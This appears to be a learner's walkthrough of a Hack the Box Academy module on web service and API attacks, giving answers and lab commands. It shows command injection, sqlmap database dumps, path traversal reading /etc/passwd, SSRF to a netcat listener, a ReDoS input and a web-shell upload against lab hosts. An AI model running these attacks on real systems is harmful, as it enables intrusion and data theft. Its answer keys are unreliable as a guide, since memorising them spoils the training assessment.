# Web Service & API Attacks
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Web Service & API Attacks
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 7 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Web Services Description Language (WSDL)
### Question:
![](./attachments/Pasted%20image%2020220727112356.png)

**Answer:** `Method`

---
## SOAPAction Spoofing
### Question:
![](./attachments/Pasted%20image%2020220727112416.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 automate.py                                                         
$ uname -a
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>Linux nix01-websvc 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n</result></LoginResponse></soap:Body></soap:Envelope>'
$ 

```

**Answer:** `x86_64`

---
## Command Injection
### Question 1:
![](./attachments/Pasted%20image%2020220727112430.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl http://10.129.12.225:3003/ping-server.php/system/whoami
root
```

**Answer:** `root`

### Question 2:
![](./attachments/Pasted%20image%2020220727112446.png)

**Answer:** `URL Encoding`

---
## Information Disclosure (with a twist of SQLi)
### Question 1:
![](./attachments/Pasted%20image%2020220727112534.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 brute_api.py http://10.129.12.225:3003
Number found! 1
[{"id":"1","username":"admin","position":"1"}]
Number found! 2
[{"id":"2","username":"HTB-User-John","position":"2"}]
Number found! 3
[{"id":"3","username":"WebServices","position":"3"}]
```

**Answer:** `WebServices`

### Question 2:
![](./attachments/Pasted%20image%2020220727112542.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap 10.129.12.225:3003/?id=1 --current-db
(...)
[06:32:39] [INFO] fetching current database
current database: 'htb'

┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap 10.129.12.225:3003/?id=1 --tables -D htb 
(...)
[06:32:43] [INFO] fetching tables for database: 'htb'
Database: htb
[1 table]
+-------+
| users |
+-------+

┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap 10.129.12.225:3003/?id=1 --dump -T users -D htb
(...)
[06:32:48] [INFO] fetching entries for table 'users' in database 'htb'
Database: htb
Table: users
[4 entries]
+---------+--------------------------------+------------+
| id      | username                       | position   |
+---------+--------------------------------+------------+
| 1       | admin                          | 1          |
| 2       | HTB-User-John                  | 2          |
| 3       | WebServices                    | 3          |
| 8374932 | HTB{THE_FL4G_FOR_SQLI_IS_H3RE} | 736373     |
+---------+--------------------------------+------------+
```

**Answer:** `HTB{THE_FL4G_FOR_SQLI_IS_H3RE}`

---
## Arbitrary File Upload
### Question:
![](./attachments/Pasted%20image%2020220727112611.png)

Upload `phpbash.php`.

![](./attachments/Pasted%20image%2020220727124441.png)

![](./attachments/Pasted%20image%2020220727124517.png)

Visit the uploaded file.

![](./attachments/Pasted%20image%2020220727124628.png)

**Answer:** `nix01-websvc`

---
## Local File Inclusion (LFI)
### Question:
![](./attachments/Pasted%20image%2020220727112634.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl "http://10.129.64.147:3000/api/download/..%2f..%2f..%2f..%2fetc%2fpasswd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
(...)
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
```

**Answer:** `ubuntu`

---
## Cross-Site Scripting (XSS)
### Question:
![](./attachments/Pasted%20image%2020220727112655.png)

**Answer:** `No`

---
## Server-Side Request Forgery (SSRF)
### Question:
![](./attachments/Pasted%20image%2020220727112716.png)

```
┌──(kali㉿kali)-[~]
└─$ echo "http://10.10.14.225:4040" | tr -d '\n' | base64
aHR0cDovLzEwLjEwLjE0LjIyNTo0MDQw

┌──(kali㉿kali)-[~]
└─$ curl "http://10.129.64.147:3000/api/userinfo?id=aHR0cDovLzEwLjEwLjE0LjIyNTo0MDQw"
```

Netcat:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4040                   
listening on [any] 4040 ...
connect to [10.10.14.225] from (UNKNOWN) [10.129.64.147] 49462
GET / HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: axios/0.24.0
Host: 10.10.14.225:4040
Connection: close
```

**Answer:** `Yes`

---
## Regular Expression Denial of Service (ReDoS)
### Question:
![](./attachments/Pasted%20image%2020220727112749.png)

```
┌──(kali㉿kali)-[~]
└─$ curl "http://10.129.64.147:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
```

Takes a long time to execute, the page is vulnerable to ReDoS.

**Answer:** `Yes`

---
## XML External Entity (XXE) Injection
### Question:
![](./attachments/Pasted%20image%2020220727112812.png)

**Answer:** `File`

---
## Skills Assessment
### Question:
![](./attachments/Pasted%20image%2020220727112840.png)

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]